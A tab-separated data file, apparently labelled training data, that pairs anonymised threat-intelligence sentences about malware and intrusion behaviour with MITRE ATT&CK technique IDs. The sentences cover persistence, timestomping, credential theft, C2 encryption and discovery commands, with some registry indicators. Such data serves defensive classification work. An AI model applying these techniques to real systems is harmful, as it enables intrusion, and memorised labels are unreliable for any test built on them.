sets a WH_CBT Windows hook to collect information on process creation.	['T1057']
sets a WH_CBT Windows hook to search for and capture files on the victim.	['T1083']
sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.	['T1070.006']
Several  backdoors achieved persistence by adding a Run key.	['T1547.001']
Several  malware families are capable of downloading and executing binaries from its C2 server.	['T1105']
Several  malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by  also collects disk space information and sends it to its C2 server.	['T1082']
Several  malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another  malware sample XORs C2 traffic.  malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, evading SSL man-in-the-middle decryption attacks.	['T1573']
Several  malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.	['T1070.006']
Several  malware samples use a common function to identify target files by their extension.  malware families can also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.	['T1083']
Several  tools encode data with base64 when posting it to a C2 server.	['T1132']
shellcode decrypts and decompresses its RC4-encrypted payload.	['T1140']
side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.	['T1574.002']
Some  malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes commonly used ports such as 443, 53, 80, 25, and 8080.	['T1043']
Some  malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes uncommonly used ports such as 995, 1816, 465, 1521, 3306, and many others.	['T1571']
Some  malware uses multiple channels for C2, such as RomeoWhiskey-Two, which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions.	['T1026']
Some resources in  are encrypted with a simple XOR operation or encoded with Base64.	['T1027']
Some  samples contain a publicly available Web browser password recovery tool.	['T1003']
Some  samples have a module to extract email from Microsoft Exchange servers using compromised credentials.	['T1078', 'T1114']
Some  samples have a module to use pass the ticket with Kerberos for authentication.	['T1550.003']
Some  samples install themselves as services for persistence by calling WinExec with the net start argument.	['T1543.003']
Some  samples use a custom encryption method for C2 traffic using AES, base64 encoding, and multiple keys.	['T1573']
Some  samples use AES to encrypt C2 traffic.	['T1573']
Some  samples use cmd.exe to delete temporary files.	['T1070.004']
Some  samples were signed with a stolen digital certificate.	['T1553.002']
Some strings in are obfuscated with XOR x56.	['T1027']
Some  variants have used South Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.	['T1071']
Some variants of  achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.	['T1546.015']
"Some variants of  use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows ""AppInit_DLLs""=""pserver32.dll"""	['T1546.010']
Some variants of  use SSL to communicate with C2 servers.	['T1071']
Some  variants use HTTP for C2.	['T1071']
Some  variants use ports 8080 and 8000 for C2.	['T1043']
Some  variants use raw TCP for C2.	['T1095']
Some  variants use SSL to encrypt C2 communications.	['T1573']
Some  versions have an embedded DLL known as MockDll that uses  and regsvr32 to execute another payload.	['T1218.010']
Some  versions have an embedded DLL known as MockDll that uses process hollowing and  to execute another payload.	['T1055.012']
Some versions of  have used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.	['T1573']
spawns a new copy of c:\windows\syswow64\explorer.exe and then replaces the executable code in memory with malware.	['T1055.012']
spearphished victims via Facebook and Whatsapp.	['T1566.003']
spear phishing campaigns have included malicious Word documents with DDE execution.	['T1559.002']
specifically looks for Domain Admins, Power Users, and the Administrators groups within the domain and locally	['T1069']
splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.	['T1030']
stages command output and collected data in files before exfiltration.	['T1074']
stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.	['T1074']
steals credentials from compromised hosts. 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  include ones associated with The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, Internet Explorer, Microsoft Outlook, WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).	['T1003']
steals credentials from its victims.	['T1003']
steals credentials stored in Web browsers by querying the sqlite database and leveraging the Windows Vault mechanism.	['T1003']
steals data stored in the clipboard.	['T1115']
steals files based on an extension list if a USB drive is connected to the system.	['T1025']
steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.	['T1005']
steals user files from local hard drives with file extensions that match a predefined list.	['T1005']
steals user files from network shared drives with file extensions and keywords that match a predefined list.	['T1039']
stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.	['T1547.001']
stores configuration values under the Registry key HKCU\Software\Microsoft\[dllname] and modifies Registry keys under HKCR\CLSID\...\InprocServer32with a path to the launcher.	['T1112']
stores information gathered from the endpoint in a file named 1.hwp.	['T1074']
stores itself in ~/Library/.DS_Stores/	['T1564.001']
stores output from command execution in a .dat file in the %TEMP% directory.	['T1074']
stores the encoded configuration file in the Registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentContorlSet\Control\WMI\Security.	['T1112']
supports execution from the command-line.	['T1059']
"supports file encryption (AES with the key ""lolomycin2017"")."	['T1027']
surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.	['T1049']
surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, and in the Program Files directory.	['T1083']
surveys a system upon check-in to discover information in the Windows Registry with the reg query command.	['T1012']
surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, and net config commands.	['T1016']
surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.	['T1082']
surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands.	['T1018']
surveys a system upon check-in to discover the system time by using the net time command.	['T1124']
takes screenshots of the compromised system's desktop and saves them to C:\system\screenshot.bmp for exfiltration every 60 minutes.	['T1113']
terminates anti-malware processes if they’re found running on the system.	['T1562.001']
The 's Information Gathering Tool (IGT) includes PowerShell components.	['T1059.001']
"The ""SCOUT"" variant of  achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Registry key."	['T1547.001']
"The ""tDiscoverer"" variant of  establishes a C2 channel by downloading resources from Web services like Twitter and GitHub.  binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day."	['T1102']
"The ""Uploader"" variant of  visits a hard-coded server over HTTP/S to download the images  uses to receive commands."	['T1071']
"The ""ZR"" variant of  will check to see if known host-based firewalls are installed on the infected systems.  will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed."	['T1562.001']
The  3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.	['T1547.009', 'T1547.001']
The  backdoor compresses communications using the standard Zlib compression library.	['T1560']
The  C2 channel uses an 11-byte XOR algorithm to hide data.	['T1573']
The  C2 channel uses HTTP POST requests.	['T1071']
The C2 server response to a beacon sent by a variant of  contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of  use various XOR operations to encrypt C2 data.	['T1573']
The  client has been signed by fake and invalid digital certificates.	['T1553.002']
The  command and control protocol's data stream can be encrypted with AES-CBC.	['T1573']
The  component KillDisk is capable of deleting Windows Event Logs.	['T1070']
The  config file is encrypted with RC4.	['T1027']
The  crimeware toolkit has refined its detection of sandbox analysis environments by inspecting the process list and Registry.	['T1518.001']
The discovery modules used with  can collect information on accounts and permissions.	['T1087']
The discovery modules used with  can collect information on network connections.	['T1049']
The discovery modules used with  can collect information on process details.	['T1057']
The  dropper can delete itself from the victim. Another  variant has the capability to delete specified files.	['T1070.004']
The  dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main  component.	['T1218.011']
The  dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.	['T1036']
The  dropper uses a function to obfuscate the name of functions and other parts of the malware.	['T1027']
The  dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.	['T1047']
The executable version of  has a module to log keystrokes.	['T1056']
The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by  as a name for malware.	['T1036']
The  group has been known to compress data before exfiltration.	['T1560']
The  group has used other forms of obfuscation, include commingling legitimate traffic with communications traffic so that network streams appear legitimate. Some malware that has been used by  also uses steganography to hide communication in PNG image files.	['T1001']
The  group is known to utilize WMI for lateral movement.	['T1047']
The initial beacon packet for  contains the operating system version and file system of the victim.	['T1082']
The initial beacon packet for  contains the operating system version of the victim.	['T1082']
The  installer loads a DLL using rundll32.	['T1218.011']
The  loader implements itself with the name Security Support Provider, a legitimate Windows function. Various  .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare.  also disguised malicious modules using similar filenames as custom network encryption software on victims.	['T1036']
The  malware communicates through the use of events in Google Calendar.	['T1102']
The  malware communicates to its command server using HTTP with an encrypted payload.	['T1071']
The  malware platform can use ICMP to communicate between infected computers.	['T1095']
The  malware platform can use Windows admin shares to move laterally.	['T1021.002']
The  malware supports timestomping.	['T1070.006']
The net accounts and net accounts /domain commands with  can be used to obtain password policy information.	['T1201']
The net time command can be used in  to determine the local or remote system time.	['T1124']
The net user username \password and net user username \password \domain commands in  can be used to create a local or domain account respectively.	['T1136']
The OsInfo function in  collects a running process list.	['T1057']
The OsInfo function in  collects the current running username.	['T1033']
The  payload is stored in a hidden directory at /Users/Shared/.local/kextd.	['T1564.001']
The payload of  is encrypted with simple XOR with a rotating key. The  configuration file has been encrypted with RC4 keys.	['T1027']
The  RAT has a keylogger.	['T1056']
The reconnaissance modules used with  can collect information on network configuration.	['T1016']
There is a variant of  that uses a PowerShell script instead of the traditional PE form.	['T1059.001']
The Ritsol backdoor trojan used by  can download files onto a compromised host from a remote location.	['T1105']
The  trojan supports file deletion.	['T1070.004']
The  uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.	['T1070.004']
"To establish persistence,  adds a Registry Run key with a value ""TaskMgr"" in an attempt to masquerade as the legitimate Windows Task Manager."	['T1036']
To establish persistence,  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.	['T1547.009', 'T1036', 'T1547.001']
tools attempt to spoof anti-virus processes as a means of self-defense.	['T1036']
tools contained an application to check performance of USB flash drives.	['T1120']
Traffic traversing the  network will be forwarded to multiple nodes before exiting the  network and continuing on to its intended destination.	['T1090.003']
transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.	['T1041']
transfers files from the compromised host via HTTP or HTTPS to a C2 server.	['T1071']
"tries to add a Registry Run key under the name ""Windows Update"" to establish persistence."	['T1547.001']
tries to add a scheduled task to establish persistence.	['T1053.005']
TRINITY malware used by  identifies payment card track data on the victim and then copies it to a local file in a subdirectory of C:\Windows\. Once the malware collects the data,  actors compressed data and moved it to another staging system before exfiltration.	['T1074']
typically use ping and  to enumerate systems.	['T1018']
uploads and downloads information.	['T1105']
uploads data in 2048-byte chunks.	['T1030']
uploads files and secondary payloads to the victim's machine.	['T1105']
used a cloud-based remote access software called LogMeIn for their attacks.	['T1219']
used a cron job for persistence on Mac devices.	['T1053']
used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.	['T1033']
used a rootkit to modify typical server functionality.	['T1014']
used a SharePoint enumeration and data dumping tool known as spwebmember.	['T1213']
used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.	['T1083']
used Base64 to encode C2 traffic.	['T1132']
used Base64 to obfuscate commands and the payload.	['T1027']
used batch scripts to enumerate network information, including information about trusts, zones, and the domain.	['T1016']
used batch scripts to enumerate users in the victim environment.	['T1087']
used cmd.exe to launch commands on the victim’s machine.	['T1059']
used command line for execution.	['T1059']
used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.	['T1102']
used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.	['T1220']
used PowerShell scripts for execution.	['T1059.001']
used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.	['T1018', 'T1046']
used RDP to move laterally in victim networks.	['T1021.001']
used regsvr32.exe to execute scripts.	['T1218.010']
used Regsvr32 to bypass application whitelisting techniques.	['T1218.010']
used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.	['T1053.005']
used SMTP as a communication channel in various implants, initially using self-registered Google Mail accounts and later compromised email servers of its victims. Later implants such as  use a blend of HTTP and other legitimate channels, depending on module configuration.	['T1071']
used spearphishing emails with malicious Microsoft Word attachments to infect victims.	['T1598.002']
used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.	['T1598.003']
used sticky-keys to obtain unauthenticated, privileged console access.	['T1546.008']
used the Ammyy Admin tool as well as TeamViewer for remote access.	['T1219']
used the Plink command-line utility to create SSH tunnels to C2 servers.	['T1573', 'T1071']
used the PowerShell filenames Office365DCOMCheck.ps1 and SystemDiskClean.ps1.	['T1036']
used  to download payloads, run a reverse shell, and execute malware on the victim's machine.	['T1059.001']
used  to launch an authentication window for users to enter their credentials.	['T1187']
used  to remove artifacts from victims.	['T1070']
used UPX to pack files.	['T1027.002']
used various social media channels to spearphish victims.	['T1566.003']
used VBS and JavaScript scripts to help perform tasks on the victim's machine.	['T1064']
used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.	['T1133']
use HTTPS for all command and control communication methods.	['T1071']
uses 's malleable C2 functionality to blend in with network traffic.	['T1095']
uses 443 for C2 communications.	['T1043']
uses a backup communication method with an HTTP beacon.	['T1008']
uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.	['T1547.001']
uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.	['T1112']
uses a batch file to kill a security program task and then attempts to remove itself.	['T1064']
uses a batch file to load a DLL into the svchost.exe process.	['T1055']
uses a command-line interface.	['T1059']
uses a command-line interface to interact with systems.	['T1059']
uses a copy of tor2web proxy for HTTPS communications.	['T1090.003']
uses a custom binary protocol for C2 communications.	['T1095']
uses a custom binary protocol to beacon back to its C2 server. It has also used XOR for encrypting communications.	['T1095']
uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.	['T1043', 'T1071']
uses a custom command and control protocol that communicates over commonly used ports. The C2 protocol is encapsulated in common application layer protocols.	['T1043']
uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.	['T1573']
uses a custom DNS tunneling protocol for C2.	['T1095']
uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.	['T1573']
uses a custom encryption algorithm on data sent back to the C2 server over HTTP.	['T1573']
uses a customized XOR algorithm to encrypt C2 communications.	['T1573']
uses a custom packer.	['T1027.002']
uses a custom packing algorithm.	['T1027.002']
uses a custom TCP protocol for C2.	['T1095']
uses a custom UDP protocol to communicate.	['T1095']
uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.	['T1553.002']
uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.	['T1140']
uses AES to encrypt C2 communications.	['T1573']
uses AES to encrypt certain information sent over its C2 channel.	['T1573']
uses AES to encrypt network communication.	['T1573']
uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.	['T1074', 'T1564.001']
uses a keylogger and steals clipboard contents from victims.	['T1056']
uses a keylogger plugin to gather keystrokes.	['T1056']
uses a keylogger to capture keystrokes.	['T1056']
uses a keylogger to capture keystrokes and location of where the user is typing.	['T1056']
uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.	['T1056']
uses a large list of C2 servers that it cycles through until a successful connection is established.	['T1008']
uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.	['T1110']
uses a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.	['T1047']
uses a module to execute Mimikatz with PowerShell to perform .	['T1064', 'T1059.001']
uses a module to receive a notification every time a USB mass storage device is inserted into a victim.	['T1120']
uses  and other Active Directory utilities to enumerate hosts.	['T1018']
uses a Port 22 malware variant to modify several Registry keys.	['T1112']
uses a PowerShell script to launch shellcode that retrieves an additional payload.	['T1059.001']
uses AppleScript to create a login item for persistence.	['T1059.002']
uses a simple one-byte XOR method to obfuscate values in the malware.	['T1027']
uses a sophisticated keylogger.	['T1056']
uses a specific port of 443 and can also use ports 53 and 80 for C2. One  variant uses HTTP over port 443 to connect to its C2 server.	['T1043']
uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.	['T1091']
uses a variation of the XOR cipher to encrypt files before exfiltration.	['T1486']
uses a virus that propagates by infecting executables stored on shared drives.	['T1080']
uses a WMI event subscription to establish persistence.	['T1546.003']
uses Base64 encoding for C2 traffic.	['T1132']
uses Base64 encoding for communication in the message body of an HTTP request.	['T1132']
uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.	['T1102']
uses character replacement,  environment variables, and XOR encoding to obfuscate code.	['T1027']
uses cloud based services for C2.	['T1102']
uses cmd.exe and /bin/bash to execute commands on the victim’s machine.	['T1059']
uses cmd.exe to execute commands for discovery.	['T1059']
uses cmd.exe to execute commands on the victim’s machine.	['T1059']
uses cmd.exe to execute scripts and commands on the victim’s machine.	['T1059']
uses cmd.exe to run commands for enumerating the host.	['T1059']
uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.	['T1059']
uses COM hijacking as a method of persistence.	['T1546.015']
uses command line for execution.	['T1059']
uses commands such as netsh advfirewall firewall to discover local firewall settings.	['T1518.001']
uses commands such as netsh interface show to discover network interface settings.	['T1016']
uses credential dumpers such as  and  to extract cached credentials from Windows systems.	['T1003']
uses custom base64 encoding to obfuscate HTTP traffic.	['T1132']
uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.	['T1574.001']
uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.	['T1574.002']
uses DLL side-loading to load malicious programs.	['T1574.002']
uses DNS as its C2 protocol.	['T1071']
uses DNS for C2.	['T1071']
uses DNS for the C2 communications.	['T1071']
uses DNS TXT records for C2.	['T1071']
uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended desitnation.	['T1090.004']
uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.	['T1027']
uses FakeTLS to communicate with its C2 server.	['T1573']
uses fake Transport Layer Security (TLS) to communicate with its C2 server, encoding data with RC4 encryption.	['T1573']
uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.	['T1036']
uses FTP for command and control.	['T1071']
uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.	['T1071']
uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.	['T1008']
uses HTTP, HTTPS, FTP, and FTPS to communicate with the C2 server.  can also act as a webserver and listen for inbound HTTP requests through an exposed API.	['T1071']
uses HTTP and HTTPS for C2.	['T1071']
uses HTTP and HTTPS for command and control.	['T1071']
uses HTTP and HTTPS to communicate with the C2 server.	['T1071']
uses HTTP as a transport to communicate with its command server.	['T1071']
uses HTTP for C2.	['T1071']
uses HTTP for C2 communication.	['T1071']
uses HTTP for C2 communications.	['T1071']
uses HTTP for command and control communication.	['T1071']
uses HTTP for communication to the control servers.	['T1071']
uses HTTP for communication with the C2 server.	['T1071']
uses HTTP or HTTPS for C2.	['T1071']
uses HTTP over SSL to communicate commands with the control server.	['T1071']
uses HTTP POST requests with data formatted using a custom protocol.	['T1095']
uses HTTPS, HTTP, and DNS for C2 communications.	['T1071']
uses HTTPS for C2.	['T1071']
uses HTTPS for C2 communications.	['T1071']
uses HTTPS for command and control.	['T1071']
uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.	['T1071']
uses HTTP TCP port 80 and HTTPS TCP port 443 for communications.	['T1043']
uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.	['T1071']
uses ipconfig /all and route PRINT to identify network adapter and interface information.	['T1016']
uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, and CVE-2015-1641.	['T1203']
uses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server. It has also obfuscated its C2 traffic as normal traffic to sites such as Github.	['T1102']
uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.	['T1104']
uses mshta.exe to load its program and files.	['T1218.005']
uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.	['T1008']
uses multiple techniques to obfuscate strings, including XOR.	['T1027']
uses netstat -ano to search for specific IP address ranges.	['T1049']
uses Pastebin to store its real C2 addresses.	['T1102']
uses port 443 for C2.	['T1043']
uses port 443 for C2 communications.	['T1043']
uses port 46769 for C2.	['T1571']
uses port 8000 and 443 for C2.	['T1043']
uses port 8080 for C2.	['T1043']
uses port 80 for C2.	['T1043']
uses Port Numbers 443 and 80 for the C2 server.	['T1043']
uses ports 447 and 8082 for C2 communications.	['T1571']
uses ports 80, 443, and 8080 for C2.	['T1043']
uses PowerShell for execution.	['T1059.001']
uses PowerShell scripts for execution.	['T1059.001']
uses PowerShell to add a Registry Run key in order to establish persistence.	['T1547.001']
uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.	['T1087']
uses public sites such as github.com and sendspace.com to upload files and then download them to victim computers.	['T1105']
uses Putty and VNC for lateral movement.	['T1021']
uses RC4 and Base64 to obfuscate strings.	['T1027']
uses RC4 encryption to obfuscate HTTP traffic.	['T1573']
uses RC4 to encrypt C2 traffic.	['T1573']
uses RC4 to encrypt the message body of HTTP content.	['T1573']
uses RDP to tunnel traffic from a victim environment.	['T1071']
uses reflective DLL injection to inject the malicious library and execute the RAT.	['T1055']
uses reg add to add a Registry Run key for persistence.	['T1112']
uses remote services such as VPN, Citrix, or OWA to persist in an environment.	['T1133']
uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.	['T1218.011']
uses rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\”vert” = “rundll32.exe c:\windows\temp\pvcu.dll , Qszdez”.	['T1218.011']
uses rundll32.exe to load its DLL.	['T1218.011']
uses Rundll32 for executing the dropper program.	['T1218.011']
uses rundll32 to call an exported function.	['T1218.011']
uses Rundll32 to ensure only a single instance of itself is running at once.	['T1218.011']
uses Rundll32 to load a malicious DLL.	['T1218.011']
uses rundll32 within  entries to execute malicious DLLs.	['T1218.011']
uses run keys for persistence on Windows	['T1547.001']
"uses scheduled tasks typically named ""Watchmon Service"" for persistence."	['T1053.005']
uses scripts to enumerate IP ranges on the victim network.  has also issued the command net view /domain to a  implant to gather information about remote systems on the network.	['T1018']
uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.	['T1574.001']
"uses services.exe to register a new autostart service named ""Audit Service"" using a copy of the local lsass.exe file."	['T1569.002', 'T1543.003']
uses single-byte XOR obfuscation to obfuscate many of its files.	['T1027']
uses SSL/TLS and RC4 to encrypt traffic.	['T1573']
uses SSL to encrypt its communication with its C2 server.	['T1071']
uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).	['T1027']
uses svchost.exe to execute a malicious DLL included in a new service group.	['T1569.002']
uses systeminfo on a victim’s machine.	['T1082']
uses tasklist /v to check running processes.	['T1057']
uses the API call ShellExecuteW for execution.	['T1106']
uses the Camellia cipher to encrypt communications.	['T1573']
uses the certutil command to decode a payload file.	['T1140']
uses the command line.	['T1059']
uses the command line and rundll32.exe to execute.	['T1059']
uses the command-line interface.	['T1059']
uses the command-line interface to execute arbitrary commands.	['T1059']
uses the command prompt to execute commands on the victim's machine.	['T1059']
uses the command reg query “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings”.	['T1012']
uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2.  also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.	['T1027']
uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the  malware.	['T1105']
uses the Dropbox cloud storage service for command and control.	['T1102']
uses the email platform, Naver, for C2 communications, leveraging SMTP.	['T1071']
uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\; the malicious file by the same name is saved in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\.	['T1036']
uses the Invoke-Obfuscation framework to obfuscate their PowerShell and also performs other code obfuscation.	['T1027']
uses the ipconfig /all command to gather the victim’s IP address.	['T1016']
uses the ipconfig command.	['T1016']
uses the keychaindump project to read securityd memory.	['T1555.002']
uses the Microsoft  utility to list processes running on systems.	['T1057']
uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.	['T1018']
uses the net user command.	['T1087']
uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\Intel\Skype.	['T1123', 'T1125']
uses the tasklist to view running processes on the victim’s machine.	['T1057']
uses the Windows API call, CreateProcessW(), to manage execution flow.	['T1106']
uses  to clean up the environment and attempt to prevent detection.	['T1070.004']
uses  to execute a payload or commands on a remote host.	['T1569.002']
uses  to inject shellcode into PowerShell.	['T1059.001']
uses Twitter as a backup C2 method. It also has a module designed to post messages to the Russian VKontakte social media site.	['T1102']
uses variations of a simple XOR encryption routine for C&C communications.	['T1573']
uses various WMI queries to check if the sample is running in a sandbox.	['T1047']
uses VBScripts and batch scripts.	['T1064']
uses VNC to connect into systems.	['T1021']
uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.	['T1185']
uses Web shells on publicly accessible Web servers to access victim networks.	['T1505.003']
uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.	['T1047', 'T1518.001']
uses WMI to check for anti-virus software installed on the system.	['T1518.001']
uses WMI to perform discovery techniques.	['T1047']
uses XOR with random keys for its communications.	['T1573']
uses ZPP, a .NET console program, to compress files with ZIP.	['T1560']
variants can add malicious DLL modules as new services.	['T1543.003']
variants can use ports 443, 8443, and 8080 for communications.	['T1043']
variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe, as well as by adding a new service named OfficeUpdateService.	['T1036']
variants have communicated with C2 servers over HTTP and HTTPS.	['T1071']
Variants of  achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\WINDOWS\ntshrui.dll).	['T1574.001']
"Variants of  encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the ""srand"" and ""rand"" functions."	['T1027']
Variants of  have added Run Registry keys to establish persistence.	['T1547.001']
Variants of  have used rundll32.exe in Registry values added to establish persistence.	['T1218.011']
variants reported on in 2014 and 2015 used a simple XOR cipher for C2.	['T1573']
Various implementations of  communicate with C2 over HTTP, SMTP, and POP3.	['T1071']
Various  malware enumerates logged-on users.	['T1033']
version of  adds a registry key to HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run for persistence.	['T1547.001']
"versions are signed with various valid certificates; one was likely faked and issued by Comodo for ""Solid Loop Ltd,"" and another was issued for ""Ultimate Computer Support Ltd."""	['T1553.002']
was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.	['T1195']
was distributed through a compromised update to a Tor client with a coin miner payload.	['T1195']
was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.	['T1189']
was likely obfuscated using Invoke-Obfuscation.	['T1027']
When a document is found matching one of the extensions in the configuration,  uploads it to the C2 server.	['T1020']
When it first starts,  crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.	['T1005']
When it first starts,  crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.	['T1039']
will attempt to detect if the infected host is configured to a proxy. If so,  will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.	['T1008']
will attempt to detect if the infected host is configured to a proxy. If so,  will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.  will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2. Adversaries can also use  to establish an RDP connection with a controller over TCP/7519.	['T1071']
will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.	['T1021.002']
"will decrypt resources it downloads with HTTP requests by using RC4 with the key ""ScoutEagle."""	['T1573']
will identify Microsoft Office documents on the victim's computer.	['T1005']
will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).	['T1055']
will sleep until after a date/time value loaded from a .dat file has passed. This allows the RAT to remain dormant until a set date, which could allow a means to regain access if other parts of the actors' toolset are removed from a victim.	['T1108']
will timestomp any files or payloads placed on a target machine to help them blend in.	['T1070.006']
will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS instead if the DES decoding fails.	['T1573']
writes data into the Registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Pniumj.	['T1112']
writes multiple outputs to a TMP file using the >> method.	['T1074']
